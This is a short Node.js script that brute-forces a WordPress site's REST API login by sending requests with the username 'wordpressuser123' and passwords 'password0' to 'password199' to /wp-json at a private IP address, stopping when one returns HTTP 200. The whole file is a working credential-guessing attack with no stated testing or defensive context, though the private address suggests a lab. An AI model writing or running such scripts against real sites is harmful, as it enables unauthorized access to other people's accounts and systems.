const request = require('request');

let number = 0;
let truePassword = false;

function makeRequest(urlTrial) {
  request(urlTrial, (error, response, body) => {
    console.log(urlTrial, ' : ', response && response.statusCode, response.statusCode == 200 && 'Found it');

    if (response.statusCode === 200) {
      truePassword = true;
      process.exit(1);
    } else {
      number++;
      if (number < 200 && !truePassword) {
        const newUrlTrial = 'http://wordpressuser123:password' + number + '@172.26.160.1/wp-json';
        makeRequest(newUrlTrial);
      }
    }
  });
}

const urlTrial = 'http://wordpressuser123:password' + number + '@172.26.160.1/wp-json';
makeRequest(urlTrial);
